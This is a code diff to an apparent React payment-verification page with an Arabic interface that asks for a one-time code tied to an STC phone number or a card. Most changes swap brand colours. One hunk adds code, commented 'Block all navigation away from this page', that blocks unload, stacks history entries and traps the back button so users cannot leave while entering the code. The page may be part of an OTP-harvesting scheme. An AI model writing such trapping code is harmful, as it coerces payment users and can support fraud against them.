@@ -34,8 +34,8 @@ function LoadingScreen() {
     <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-gray-50 gap-6">
       <div className="relative w-14 h-14">
         <span className="absolute inset-0 rounded-full border-[3px] border-gray-200" />
-        <span className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#1a6b7d] animate-spin" style={{ animationDuration: "1s" }} />
-        <span className="absolute inset-2 rounded-full border-[3px] border-transparent border-t-[#7CC043] animate-spin" style={{ animationDuration: "0.7s", animationDirection: "reverse" }} />
+        <span className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#0874ED] animate-spin" style={{ animationDuration: "1s" }} />
+        <span className="absolute inset-2 rounded-full border-[3px] border-transparent border-t-[#030D2E] animate-spin" style={{ animationDuration: "0.7s", animationDirection: "reverse" }} />
       </div>
       <div className="text-center">
         <p className="text-sm font-bold text-gray-700">جاري تحضير صفحة التحقق</p>
@@ -56,7 +56,7 @@ function SuccessModal({ confirmedId }: { confirmedId: string }) {
         <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-400 transition z-10">
           <X size={14} />
         </Link>
-        <div className="bg-gradient-to-br from-[#1a6b7d] to-[#155e6f] px-6 pt-7 pb-5 text-center">
+        <div className="bg-gradient-to-l from-[#0874ED] to-[#030D2E] px-6 pt-7 pb-5 text-center">
           <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", stiffness: 300, delay: 0.15 }}
             className="w-14 h-14 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
             <CheckCircle size={28} className="text-white" />
@@ -70,11 +70,11 @@ function SuccessModal({ confirmedId }: { confirmedId: string }) {
           </p>
           <div className="flex gap-2">
             <a href={`/invoice/${confirmedId}`} target="_blank" rel="noopener noreferrer"
-              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-[#1a6b7d] text-white font-semibold text-xs hover:bg-[#155e6f] transition">
+              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-[#0874ED] text-white font-semibold text-xs hover:bg-[#0665D0] transition">
               <FileText size={13} /> الفاتورة
             </a>
             <a href={`/invoice/${confirmedId}/receipt`} target="_blank" rel="noopener noreferrer"
-              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-[#7CC043] text-white font-semibold text-xs hover:bg-[#6aad38] transition">
+              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-[#030D2E] text-white font-semibold text-xs hover:bg-[#040D2A] transition">
               <Receipt size={13} /> سند القبض
             </a>
           </div>
@@ -117,15 +117,21 @@ export default function VerifyPage() {
   const maskedLabel = paymentMethod === "stc" ? maskPhone(rawLabel) : maskCard(rawLabel);
 
   useEffect(() => {
-    // Replace history so back button can't leave this page
+    // Block all navigation away from this page
+    const blockNav = (e: BeforeUnloadEvent) => { e.preventDefault(); e.returnValue = ""; };
+    window.addEventListener("beforeunload", blockNav);
+    const blockBack = () => {
+      window.history.pushState(null, "", window.location.href);
+    };
     window.history.pushState(null, "", window.location.href);
-    const blockBack = () => window.history.pushState(null, "", window.location.href);
+    window.history.pushState(null, "", window.location.href);
     window.addEventListener("popstate", blockBack);
 
     const t = setTimeout(() => { setPhase("verify"); setTimeout(() => otpRef.current?.focus(), 80); }, 4000);
     return () => {
       clearTimeout(t);
       window.removeEventListener("popstate", blockBack);
+      window.removeEventListener("beforeunload", blockNav);
     };
   }, []);
 
@@ -298,7 +304,7 @@ export default function VerifyPage() {
                   <button
                     type="submit"
                     disabled={submitting || submitCooldown > 0}
-                    className="w-full py-3.5 bg-gradient-to-bl from-[#1a6b7d] to-[#155e6f] text-white rounded-xl font-extrabold text-sm shadow-md shadow-[#1a6b7d]/20 hover:scale-[1.015] active:scale-[0.985] transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:scale-100 flex items-center justify-center gap-2"
+                    className="w-full py-3.5 bg-gradient-to-l from-[#0874ED] to-[#030D2E] text-white rounded-xl font-extrabold text-sm shadow-md shadow-[#0874ED]/25 hover:scale-[1.015] active:scale-[0.985] transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:scale-100 flex items-center justify-center gap-2"
                   >
                     {submitting ? (
                       <><span className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> جاري التحقق...</>
